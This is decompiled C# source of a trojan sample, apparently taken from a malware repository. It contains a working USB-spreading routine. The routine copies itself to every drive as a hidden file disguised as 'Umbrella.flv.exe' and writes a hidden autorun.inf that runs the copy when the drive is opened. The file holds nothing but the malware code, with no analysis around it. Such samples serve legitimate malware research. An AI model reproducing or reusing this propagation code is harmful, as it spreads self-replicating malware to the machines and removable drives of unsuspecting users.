// Decompiled with JetBrains decompiler
// Type: Usb1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 80F3D6AD-D502-4CFE-A32C-03E83ADAF2E9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-17877cf37b9264ba88dcfd0825f321f42531f8b880c52b43c0606b0b2c06d548.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Windows.Forms;

[StandardModule]
internal sealed class Usb1
{
  public static void infect()
  {
    string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
    string[] logicalDrives = Directory.GetLogicalDrives();
    int index = 0;
    while (index < logicalDrives.Length)
    {
      string str = logicalDrives[index];
      try
      {
        File.Copy(Application.ExecutablePath, str + "Umbrella.flv.exe");
        StreamWriter streamWriter = new StreamWriter(str + "\\autorun.inf");
        streamWriter.WriteLine("[autorun]");
        streamWriter.WriteLine("open=" + str + "Umbrella.flv.exe");
        streamWriter.WriteLine("shellexecute=" + str, (object) 1);
        streamWriter.Close();
        File.SetAttributes(str + "autorun.inf", FileAttributes.Hidden);
        File.SetAttributes(str + "Umbrella.flv.exe", FileAttributes.Hidden);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      checked { ++index; }
    }
  }
}
